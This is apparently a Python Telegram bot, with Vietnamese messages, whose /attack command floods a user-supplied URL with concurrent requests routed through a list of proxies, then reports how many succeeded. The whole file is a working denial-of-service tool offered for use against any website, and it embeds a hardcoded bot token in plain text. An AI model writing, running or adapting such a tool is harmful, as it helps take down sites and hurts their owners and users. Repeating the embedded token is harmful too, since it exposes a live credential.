import telebot
from concurrent.futures import ThreadPoolExecutor
import requests

TOKEN = '6973955604:AAFJFKsmH8lklWbMcfG-UOmokqyrusV3jYE'
bot = telebot.TeleBot(TOKEN)

def load_proxies():
    with open("proxy.txt", "r") as file:
        return [line.strip() for line in file.readlines() if line.strip()]

def make_request(url, proxy):
    proxies = {
        "http": proxy,
        "https": proxy
    }
    try:
        response = requests.get(url, proxies=proxies)
        return response.status_code
    except Exception as e:
        return e

@bot.message_handler(commands=['attack'])
def send_request(message):
    args = message.text.split()
    if len(args) != 2:
        bot.reply_to(message, 'Vui lòng sử dụng cú pháp: /attack <url>')
        return
    
    url = args[1]
    chat_id = message.chat.id
    
    proxies = load_proxies()
    if not proxies:
        bot.send_message(chat_id, "Không có proxy nào được tìm thấy trong file.")
        return

    # Đảm bảo không gửi nhiều hơn số lượng proxy có sẵn
    num_requests = min(1000000, len(proxies))
    
    with ThreadPoolExecutor(max_workers=num_requests) as executor:
        future_results = [executor.submit(make_request, url, proxies[i]) for i in range(num_requests)]
    
    results = [future.result() for future in future_results]
    success_count = sum(1 for result in results if result == 200)
    
    response_message = f"Attack sent successfully💫\n⌲ Url : {url} \n⌲ {success_count} The request was successful."
    bot.send_message(chat_id, response_message)

if __name__ == '__main__':
    bot.polling()